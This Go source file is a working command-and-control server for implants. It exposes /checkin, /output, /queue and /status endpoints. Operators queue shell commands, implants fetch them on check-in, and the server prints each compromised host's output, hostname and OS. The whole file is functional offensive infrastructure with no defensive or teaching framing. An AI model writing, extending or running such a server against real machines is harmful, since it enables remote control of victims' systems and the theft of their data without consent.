package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"sync"
	"time"
)

// Command represents a command to send to the implant
type Command struct {
	ID      string `json:"id"`
	Command string `json:"command"`
}

// Response represents the response from the implant
type Response struct {
	ID       string `json:"id"`
	Output   string `json:"output"`
	Error    string `json:"error,omitempty"`
	ExitCode int    `json:"exit_code"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
}

// C2Server represents the command and control server
type C2Server struct {
	Port         string
	PendingCmds  map[string]Command
	Responses    map[string]Response
	CheckIns     []map[string]interface{}
	mu           sync.RWMutex
	CommandQueue []Command
}

// NewC2Server creates a new C2 server instance
func NewC2Server(port string) *C2Server {
	return &C2Server{
		Port:        port,
		PendingCmds: make(map[string]Command),
		Responses:   make(map[string]Response),
		CheckIns:    make([]map[string]interface{}, 0),
	}
}

// handleCheckIn handles check-in requests from implants
func (s *C2Server) handleCheckIn(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read body", http.StatusBadRequest)
		return
	}

	var checkIn map[string]interface{}
	if err := json.Unmarshal(body, &checkIn); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Log check-in
	s.mu.Lock()
	checkIn["received_at"] = time.Now().Unix()
	s.CheckIns = append(s.CheckIns, checkIn)
	if len(s.CheckIns) > 100 {
		s.CheckIns = s.CheckIns[1:]
	}

	// Check if there's a command in the queue
	var cmdToSend Command
	if len(s.CommandQueue) > 0 {
		cmdToSend = s.CommandQueue[0]
		s.CommandQueue = s.CommandQueue[1:]
		s.PendingCmds[cmdToSend.ID] = cmdToSend
	}
	s.mu.Unlock()

	// Send command if available
	if cmdToSend.Command != "" {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(cmdToSend)
		log.Printf("[*] Sent command to %s: %s", checkIn["hostname"], cmdToSend.Command)
	} else {
		w.WriteHeader(http.StatusNoContent)
	}
}

// handleOutput handles command output from implants
func (s *C2Server) handleOutput(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read body", http.StatusBadRequest)
		return
	}

	var resp Response
	if err := json.Unmarshal(body, &resp); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Store response
	s.mu.Lock()
	s.Responses[resp.ID] = resp
	delete(s.PendingCmds, resp.ID)
	s.mu.Unlock()

	// Display output
	fmt.Printf("\n[+] Command Output [ID: %s] from %s (%s):\n", resp.ID, resp.Hostname, resp.OS)
	fmt.Printf("Exit Code: %d\n", resp.ExitCode)
	if resp.Output != "" {
		fmt.Printf("STDOUT:\n%s\n", resp.Output)
	}
	if resp.Error != "" {
		fmt.Printf("STDERR:\n%s\n", resp.Error)
	}
	fmt.Println("---")

	w.WriteHeader(http.StatusOK)
}

// handleQueueCommand handles queuing new commands
func (s *C2Server) handleQueueCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read body", http.StatusBadRequest)
		return
	}

	var cmd Command
	if err := json.Unmarshal(body, &cmd); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Generate ID if not provided
	if cmd.ID == "" {
		cmd.ID = fmt.Sprintf("cmd_%d", time.Now().UnixNano())
	}

	s.mu.Lock()
	s.CommandQueue = append(s.CommandQueue, cmd)
	s.mu.Unlock()

	log.Printf("[*] Queued command: %s (ID: %s)", cmd.Command, cmd.ID)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"id": cmd.ID, "status": "queued"})
}

// handleStatus shows server status
func (s *C2Server) handleStatus(w http.ResponseWriter, r *http.Request) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	status := map[string]interface{}{
		"pending_commands": len(s.PendingCmds),
		"queued_commands":  len(s.CommandQueue),
		"responses":        len(s.Responses),
		"check_ins":        len(s.CheckIns),
	}

	if len(s.CheckIns) > 0 {
		status["last_checkin"] = s.CheckIns[len(s.CheckIns)-1]
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(status)
}

// Start starts the C2 server
func (s *C2Server) Start() error {
	http.HandleFunc("/checkin", s.handleCheckIn)
	http.HandleFunc("/output", s.handleOutput)
	http.HandleFunc("/queue", s.handleQueueCommand)
	http.HandleFunc("/status", s.handleStatus)

	log.Printf("[*] C2 Server starting on port %s", s.Port)
	log.Printf("[*] Endpoints:")
	log.Printf("    POST /checkin  - Implant check-in")
	log.Printf("    POST /output   - Command output")
	log.Printf("    POST /queue    - Queue a command")
	log.Printf("    GET  /status   - Server status")

	return http.ListenAndServe(":"+s.Port, nil)
}

func main() {
	port := "5455"
	if len(os.Args) > 1 {
		port = os.Args[1]
	}

	server := NewC2Server(port)
	if err := server.Start(); err != nil {
		log.Fatal(err)
	}
}
